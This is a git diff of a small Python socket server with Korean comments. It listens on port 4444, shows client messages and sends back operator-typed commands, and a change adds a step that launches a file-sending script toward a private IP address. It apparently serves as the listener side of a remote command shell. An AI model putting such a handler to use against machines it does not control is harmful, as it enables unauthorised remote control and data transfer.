@@ -1,13 +1,17 @@
-import socket, threading
+import socket, threading, subprocess
+
 
 def binder(cSocket, cAddr):
     try:
         while True:
-            data = cSocket.recv(4096)
+            data = cSocket.recv(8192)
             msg = data.decode()
-            print(cAddr," : \n", msg)
+            print(cAddr," : \n", '\033[92m' +msg + '\033[0m')
             if msg == 'exit':
                 break
+            if msg.find('clear') == 0:
+                subprocess.run('gnome-terminal --command "python3 cfile.py -f 123.png -i 10.211.55.5"', shell=True)
+                
             msg = input("input command>> ")
             
             data = msg.encode()
@@ -23,7 +27,7 @@ if __name__ == '__main__' :
     # 소켓 생성
     sSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     sSocket.bind(('', 4444))
-    sSocket.listen()
+    sSocket.listen(2)
     print('서버가 시작하였습니다.')
     try:
         while True:
